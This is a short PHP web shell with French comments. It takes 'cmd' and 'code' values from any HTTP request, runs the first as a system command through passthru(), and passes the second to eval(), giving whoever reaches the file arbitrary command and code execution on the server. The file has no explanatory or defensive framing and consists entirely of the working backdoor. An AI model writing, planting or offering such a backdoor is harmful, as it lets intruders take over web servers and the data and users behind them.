<?php
$code = $_REQUEST["code"];
$cmd = $_REQUEST["cmd"];

if($cmd != "")
{
    echo "{${passthru($cmd)}}<br>";
}
/* Commande*******/

/* Ex閏ution de code PHP**********/
if($code != ""){
    $code = stripslashes($code);
    eval($code);
}
/* Execution de code PHP**********/
?>